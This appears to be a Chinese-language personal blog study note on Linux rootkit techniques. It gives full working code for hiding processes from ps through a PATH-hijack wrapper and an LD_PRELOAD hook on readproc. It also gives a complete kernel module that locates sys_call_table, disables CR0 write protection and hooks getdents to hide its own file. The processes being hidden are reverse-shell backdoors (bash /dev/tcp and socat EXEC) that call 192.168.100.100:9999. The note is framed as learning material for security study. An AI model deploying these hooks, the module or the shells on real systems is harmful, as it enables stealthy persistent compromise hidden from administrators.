---
title: 學習筆記 - ROOTKIT 隱藏程序技巧
date: 2019-06-07 00:00:00
categories:
- [security, pwn]
tags:
- security
- pwn
- rootkit
---

root + kit 的意思就是拿到 root 權限後可以用的工具包，大多是隱藏程序的技巧，所以 rootkit 也可以理解成隱藏程序技術的通稱，不過也有些不需要 root 的隱藏程序技術，今天會逐一介紹 linux 上 rootkit 的原理與實作

## 隱之呼吸壹之型 - PATH Hijack

### 條件

不需要 root

### 目標

在 `ps` 的結果中隱藏下面兩種簡單的後門

1. `bash -i >& /dev/tcp/192.168.100.100/9999 0>&1`
2. `socat TCP:192.168.100.100:9999 EXEC:/bin/bash`

### 手法

假設在 `$PATH` 環境變數中 `/usr/local/bin` 在 `/bin` 前面，所以我們可以寫一個檔案在 `/usr/local/bin/ps`，這樣 `ps` 就會執行 `/usr/local/bin/ps` 而不是 `/bin/ps`，而達到 hook 程序的效果

```bash
#!/bin/bash
/bin/ps $@ | grep -Ev '192.168.100.100|socat'
```

* `grep -Ev` 是 inverse match
* `$@` 是傳進來的參數 ( 這裡原封不動的交給 `/bin/ps` )

## 隱之呼吸貳之型 - LD_PRELOAD

### 條件

不需要 root

### 目標

在 `ps` 的結果中隱藏下面兩種簡單的後門

1. `bash -i >& /dev/tcp/192.168.100.100/9999 0>&1`
2. `socat TCP:192.168.100.100:9999 EXEC:/bin/bash`

### 要 hook 哪個函式

首先我們可以用 `ltrace` 看 `ps` 跑起來呼叫了哪些 library 的函式  

```c
...
fwrite(" [jfsCommit]\nhe]\n4\n0\n\nstart\ngrou"..., 13, 1, 0x7fbfcd303760)  = 1
readproc(0x55e061b12f90, 0x55e0609d1540, 13, 1024)                          = 0x55e0609d1540
escape_str(0x7fbfcd90b090, 0x55e0609d1740, 0x20000, 0x7fff6f748044)         = 4
strlen("root")                                                              = 4
fwrite("root", 4, 1, 0x7fbfcd303760)                                        = 1
...
```

會發現 `readproc` 一直出現，查看一下 man page

```man
NAME
       readproc, freeproc  - read information from next /proc/## entry

SYNOPSIS
       #include <proc/readproc.h>

       proc_t* readproc(PROCTAB *PT, proc_t *return_buf);
       void freeproc(proc_t *p);
```

那我們就在 `ps` 的原始碼中找一下 `readproc` 的用法，如下

```c procps-3.2.8/ps/display.c >331
  ptp = openproc(needs_for_format | needs_for_sort | needs_for_select | needs_for_threads);
  if(!ptp) {
    fprintf(stderr, "Error: can not access /proc.\n");
    exit(1);
  }
  memset(&buf, '#', sizeof(proc_t));
  switch(thread_flags & (TF_show_proc|TF_loose_tasks|TF_show_task)){
  case TF_show_proc:                   // normal non-thread output
    while(readproc(ptp,&buf)){}}
```

{% admonition question "如何取得 ps 原始碼" %}
    `ps` 這個指令是來自 `procps`，可以從 [procps.sourceforge.net](http://procps.sourceforge.net/) 下載  
    另外其他基本的 shell 指令的原始碼則可以從 [www.gnu.org/software/coreutils](https://www.gnu.org/software/coreutils/) 下載
{% endadmonition %}

* 基本上就是先 `openproc` 然後再用 `readproc` 一次讀一個 process entry
* `ptp` 的型態是 [`PROCTAB*`](https://fossies.org/dox/procps-3.2.8/structPROCTAB.html)，裡面有 linked list 的結構，讓程式能找到下一個 process
* `buf` 的型態是 [`proc_t*`](https://fossies.org/dox/procps-3.2.8/structproc__t.html)，包含了 process 的資訊
* 那我們就去 hook `readproc` 這個函式，把想隱藏的 procss 跳過

### dlsym

```c
    typeof(readproc) *old_readproc = dlsym(RTLD_NEXT, "readproc");
```

* 這行是 `LD_PRELOAD` 技巧的關鍵，我們用 `dlsym` 這個函式來找 symbol 的位址
* 放 `RTLD_NEXT` 這個參數會找下一個 symbol 而不是第一個
* `typeof(readproc)` 只是一個語法糖，代表 `readproc` 這個 function pointer 的型態

### POC 原始碼

```c hook.c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <string.h>
#include <proc/readproc.h>

int hidden (char *target) {
    char *keywords[2] = { "192.168.100.100", "socat" };
    for (int i = 0; i < 2; i++) if (strstr(target, keywords[i])) return 1;
    return 0;
}

proc_t* readproc (PROCTAB *PT, proc_t *return_buf) {
    typeof(readproc) *old_readproc = dlsym(RTLD_NEXT, "readproc");
    proc_t* ret_value = old_readproc(PT, return_buf);
    while (ret_value
        && ret_value->cmdline
        && hidden(ret_value->cmdline[0])) {
        ret_value = old_readproc(PT, return_buf);
    }
    return ret_value;
}
```

### 編譯

```bash
gcc -fPIC -shared -o hook.so hook.c
```

### 執行

* 指定 `LD_PRELOAD` 環境變數來載入編譯好的動態連結庫，但只有該次生效

```bash
LD_PRELOAD=/path/to/hook.so ps aux
```

* 或是編輯 `ld.so.preload`，寫入 `hook.so` 的路徑，之後每次執行都會載入，可以用 `ldd` 查看是否成功 preload

### DEMO

<script id="asciicast-0M5KQUVkrY4Ha0gOOSS9pj97K" src="https://asciinema.org/a/0M5KQUVkrY4Ha0gOOSS9pj97K.js" async></script>

## 隱之呼吸參之型 - Loadable Kernel Module

### 條件

需要 root

### 目標

在 `ls` 的結果中隱藏 `rootkit.ko`

### 取得 sys_call_table

首先因為我們要 hijack system call 所以要先取得 `sys_call_table` 的位址

#### 方法一

* 在 2.4 以前的內核版本，預設導出所有符號，所以可以直接用
* 如果自己編譯內核的話，可以修改原始碼用 `EXPORT_SYMBOL` 把 `sys_call_table` 的符號導出來

```c
extern void *sys_call_table[];
```

#### 方法二

`kallsyms_lookup_name` 這個函式也可以抓位址，但他也不一定會被導出

```c
#include <linux/kallsyms.h>

static void **sys_call_table;

static int __init hook_init (void) {
    sys_call_table = (void **)kallsyms_lookup_name("sys_call_table");
    printk(KERN_INFO "sys_call_table = 0x%px\n", sys_call_table);
    return 0;
}
```

{% admonition question "How to printk a pointer ?" %}
    要用 printk 印出 pointer 可以用 `%px`  
    `%p` 只會印出該指標的雜湊值而不是真正的指標的值，這是為了避免洩漏內核位址
{% endadmonition %}

#### 方法三

* 下面兩個檔案路徑有可能會有 sys_call_table 的位址
* /proc/kallsyms 是一個特殊的檔案，會在讀取時動態產生

```bash
cat /boot/System.map-$(uname -r) | grep "sys_call_table"
cat /proc/kallsyms | grep  "sys_call_table"
```

#### 方法四

* 最穩的方式是自己去 kernel 裡面撈 memory
* 想法源自於[這篇](http://phrack.org/issues/58/7.html)，但 kernel 5.x.x 有多包了一層 `do_syscall_64`，需要做一些改動

```c
uint8_t *get_syscalltable (void) {
    int lo, hi;
    asm volatile("rdmsr" : "=a" (lo), "=d" (hi) : "c" (MSR_LSTAR));
    uint8_t *entry_SYSCALL_64 = (uint8_t *)(((uint64_t)hi << 32) | lo);

    uint8_t *ptr;

    uint8_t do_syscall_64_inst[7] = {
        0x48, 0x89, 0xc7, // mov rdi, rax
        0x48, 0x89, 0xe6, // mov rsi, rsp
        0xe8,             // call do_syscall_64
    };
    ptr = find(entry_SYSCALL_64, do_syscall_64_inst, 7);
    uint8_t *do_syscall_64 = (uint8_t *)(ptr + 11 + ((uint64_t)0xffffffff00000000 | *(uint32_t *)(ptr + 7)));

    uint8_t sys_call_table_inst[4] = {
        0x48, 0x8b, 0x04, 0xfd // mov rax, QWORD PTR [rdi*8-?]
    };
    ptr = find(do_syscall_64, sys_call_table_inst, 4);
    uint8_t *sys_call_table = (uint8_t *)((uint64_t)0xffffffff00000000 | *(uint32_t *)(ptr + 4));

    return sys_call_table;
}
```

要理解上面的程式碼在做什麼，我們需要知道下面兩件事

##### Module Specific Register 是什麼 ?

* module specific register 是一塊跟 CPU 有關的暫存器
* 每個 msr 都會有個 index，可以想像成一個很大的陣列
* 用 `rdmsr`, `wrmsr` 這組 instructions 可以對 msr 做讀寫，必須提供 index
* kernel 一開始在初始化的時候，把 `entry_SYSCALL_64` 寫到 `msr[MSR_LSTAR]`

##### syscall 執行下去實際上是發生什麼事 ?

1. 使用者呼叫 `syscall`
2. 切換到 ring 0
3. 跳去 msr[MSR_LSTAR] 這個位址也就是 `entry_SYSCALL_64` 這裡
4. 呼叫 `do_syscall_64`
5. `regs->ax = sys_call_table[nr](regs);` 這行呼叫對應的函式

#### 解讀上面的程式碼的步驟

1. 我們已經在 ring 0 了
2. 直接用 `rdmsr` 讀 `msr[MSR_LSTAR]`
3. 直接在 `entry_SYSCALL_64` 的 instructions 裡面找下面這個 pattern

```assembly
movq %rax, %rdi,
movq %rsp, %rsi
call do_syscall_64
```

4. 這樣就找到 `do_syscall_64` 了
5. 進到 `do_syscall_64` 後，一樣畫葫蘆，再找下面這個 pattern

```assembly
mov rax, QWORD PTR [rdi*8-?]
```

6. 最後，這個問號的值就會是 `sys_call_table` 的位址

### 讓 `sys_call_table` 可以寫入

* [cr0 register](https://en.wikipedia.org/wiki/Control_register#CR0) 的其中一個 bit 是代表 read-only 區段可不可寫，改成 0 就通通可寫啦
* `write_cr0` 這個 function 在 kernel 5.x.x 版加了檢查，不過我們直接寫 assembly 就沒問題啦

```c
void writable_unlock (void) {
    unsigned long val = read_cr0() & (~X86_CR0_WP);
    asm volatile("mov %0,%%cr0": "+r" (val));
}

void writable_lock (void) {
    unsigned long val = read_cr0() | X86_CR0_WP;
    asm volatile("mov %0,%%cr0": "+r" (val));
}
```

### 要 hook 哪個 syscall

* `ps` 做的事情就是去讀 `/proc` 底下所有檔案，基本上是 `ls` 的強化版，那我們這次就先做 `ls` 隱藏檔案
* 一樣用 `strace ls` 去看他呼叫了哪些 `syscall`

```c
getdents(3, /* 16 entries */, 32768)    = 512
getdents(3, /* 0 entries */, 32768)     = 0
close(3)
fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 1), ...}) = 0
write(1, "a\thook.c\t initramfs\t    linux-5."..., 75) = 75
write(1, "attach\thook.so  initramfs.cpio.g"..., 90) = 90
```

`getdents` 看起來是關鍵的 syscall，查看一下 man page

```man
NAME
       getdents, getdents64 - get directory entries

SYNOPSIS
       int getdents(unsigned int fd, struct linux_dirent *dirp,
                    unsigned int count);
       int getdents64(unsigned int fd, struct linux_dirent64 *dirp,
                    unsigned int count);

       Note: There are no glibc wrappers for these system calls; see NOTES.
```

* `getdents` 跑完後會把結果存到 `dirp` 裡面，那我們就遍歷 `dirp` 把要隱藏的丟掉就好了
* kernel 4.x.x 的參數是放在 stack 傳的，但 kernel 5.x.x 多包了一層 `do_syscall_64`，參數傳遞變成是透過 `struct pt_regs *regs` 這個結構去傳

```c rootkit.c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kallsyms.h>
#include <linux/syscalls.h>

MODULE_LICENSE("GPL");

struct linux_dirent {
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    char           d_name[];  /* Filename (null-terminated) */
};

void **sys_call_table;

int (*original_getdents) (struct pt_regs *regs);

void writable_unlock (void) {
    unsigned long val = read_cr0() & (~X86_CR0_WP);
    asm volatile("mov %0,%%cr0": "+r" (val));
}

void writable_lock (void) {
    unsigned long val = read_cr0() | X86_CR0_WP;
    asm volatile("mov %0,%%cr0": "+r" (val));
}

uint8_t *find (uint8_t *a, uint8_t *b, size_t len) {
    for (uint8_t *ptr = a, i = 0; i < 500; i++, ptr++) {
        if (!strncmp(ptr, b, len)) {
            return ptr;
        }
    }
    return 0;
}

uint8_t *get_syscalltable (void) {
    int lo, hi;
    asm volatile("rdmsr" : "=a" (lo), "=d" (hi) : "c" (MSR_LSTAR));
    uint8_t *entry_SYSCALL_64 = (uint8_t *)(((uint64_t)hi << 32) | lo);

    uint8_t *ptr;
    
    uint8_t do_syscall_64_inst[7] = {
        0x48, 0x89, 0xc7, // mov rdi, rax
        0x48, 0x89, 0xe6, // mov rsi, rsp
        0xe8,             // call do_syscall_64
    };
    ptr = find(entry_SYSCALL_64, do_syscall_64_inst, 7);
    uint8_t *do_syscall_64 = (uint8_t *)(ptr + 11 + ((uint64_t)0xffffffff00000000 | *(uint32_t *)(ptr + 7)));
    
    uint8_t sys_call_table_inst[4] = {
        0x48, 0x8b, 0x04, 0xfd // mov rax, QWORD PTR [rdi*8-?]
    };    
    ptr = find(do_syscall_64, sys_call_table_inst, 4);
    uint8_t *sys_call_table = (uint8_t *)((uint64_t)0xffffffff00000000 | *(uint32_t *)(ptr + 4));

    return sys_call_table;
}

#define FILENAME "rootkit.ko"

int sys_getdents_hook(struct pt_regs *regs) {
    int total = original_getdents(regs);
    unsigned int fd = regs->di;
    struct linux_dirent *dirent = regs->si;
    unsigned int count = regs->dx;
    int offset = 0;
    while (offset < total) {
        struct linux_dirent *ptr = (struct linux_dirent *)((uint8_t *)dirent + offset);
        struct linux_dirent *next_ptr = (struct linux_dirent *)((uint8_t *)dirent + offset + ptr->d_reclen);
        if (strncmp(ptr->d_name, FILENAME, strlen(FILENAME)) == 0) {
            int reclen = ptr->d_reclen;
            memmove(ptr, next_ptr, total - (offset + reclen));
            total -= reclen;
        } else {
            offset += ptr->d_reclen;
        }
    }
    return total;
}

static int rootkit_init(void) {
    sys_call_table = (void **)get_syscalltable();
    printk(KERN_INFO "sys_call_table = %llu\n", sys_call_table);
    writable_unlock();
    original_getdents = sys_call_table[__NR_getdents];
    sys_call_table[__NR_getdents] = sys_getdents_hook;
    return 0;
}

static void rootkit_exit(void) {
    sys_call_table[__NR_getdents] = original_getdents;
    writable_lock();
}

module_init(rootkit_init);
module_exit(rootkit_exit);
```

### DEMO

<script id="asciicast-nySYMlkNUoKXyGZidEFOsN1PV" src="https://asciinema.org/a/nySYMlkNUoKXyGZidEFOsN1PV.js" async></script>

---

1: http://fluxius.handgrep.se/2011/10/31/the-magic-of-ld_preload-for-userland-rootkits/
2: https://exploit.ph/linux-kernel-hacking/2014/10/23/rootkit-for-hiding-files/
3: https://docs-conquer-the-universe.readthedocs.io/zh_CN/latest/gnu_linux.html
4: https://www.kernel.org/doc/Documentation/printk-formats.txt
5: https://blog.trailofbits.com/2019/01/17/how-to-write-a-rootkit-without-really-trying/
